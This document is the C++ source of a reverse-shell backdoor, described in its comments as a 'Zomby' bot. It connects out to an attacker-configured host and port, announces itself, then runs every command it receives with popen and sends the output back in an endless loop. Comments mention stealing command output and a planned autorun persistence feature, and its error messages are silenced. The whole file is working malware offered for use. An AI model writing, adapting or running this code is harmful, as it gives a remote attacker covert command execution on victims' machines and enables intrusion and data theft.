//(C) By ABDO10
#include <iostream>
#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h> 
#include <stdlib.h>
#include <cstdlib>
#include <cstring>
#include <netinet/in.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netdb.h> 
#include "config.h"
 
using namespace std;


   // steal cmds 

   string GetStdoutFromCommand(string cmd) {



    string data;

    FILE * stream;

    const int max_recievewelcome = 256;

    char recievewelcome[max_recievewelcome];

    cmd.append(" 2>&1");



    stream = popen(cmd.c_str(), "r");

    if (stream) {

    while (!feof(stream))

    if (fgets(recievewelcome, max_recievewelcome, stream) != NULL) data.append(recievewelcome);

    pclose(stream);

    }

    return data;

    }

typedef struct TEMPIO
{
    unsigned int id;
    unsigned short messageSender;
    unsigned short length;
    unsigned int secs;
    unsigned int usecs;
    unsigned short videoId;
    unsigned short outChannel;
}TEMPIO_msg;

int client();
int server();
void error();


void error(const char *msg)
{
    perror(msg);
    exit(0);
}


int main(int argc, char const *argv[])
{

   // variables / constants table
    struct sockaddr_in address;
    int sock = 0, valread ;
    struct sockaddr_in serv_addr;
    char hello[1000] = {" [+] Zomby Joined "};
    char recievewelcome[1024] = {0};
    char cmds[15000] ;
	


    // while failed to create socket
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {

       // printf("\n Socket creation error \n");
        return -1;
    }
 
    memset(&serv_addr, '0', sizeof(serv_addr));
 
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
     
    // Convert IPv4 and IPv6 addresses from text to binary form
    if(inet_pton(AF_INET, host, &serv_addr.sin_addr)<=0) 
    {
       // printf("\nInvalid address/ Address not supported \n");
        return -1;
    }
   
   // while failed to connect
 
    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
    {
        // printf("\nConnection Failed \n");
        return -1;
    }
   
   // welcome start msgs to start shell attack 
    send(sock , hello , strlen(hello) , 0 );
    // printf("Hacked status sent\n");
    // cout << "PORT :" << serv_addr.sin_port << endl;

   // Create Autorun file 
   // Soon ...


  // recieve back msg   
    valread = read (sock, recievewelcome , 1024);
    // printf("%s\n",recievewelcome );
    
    do {
   
   // recieving cmds
    valread = read( sock , cmds, 15000);

   //convert string to char , to steal cmds
    
    std::string scancmd = GetStdoutFromCommand(cmds);

    char *output = new char[scancmd.length() + 1]; // or
    // char y[100];

   std::strcpy(output, scancmd.c_str());
   
   // sending cmds outputs
   send(sock , output , strlen(output) , 0 );
  
   // delete outputs value
   delete[] output;

    }
    while(true);



    return 0;
}


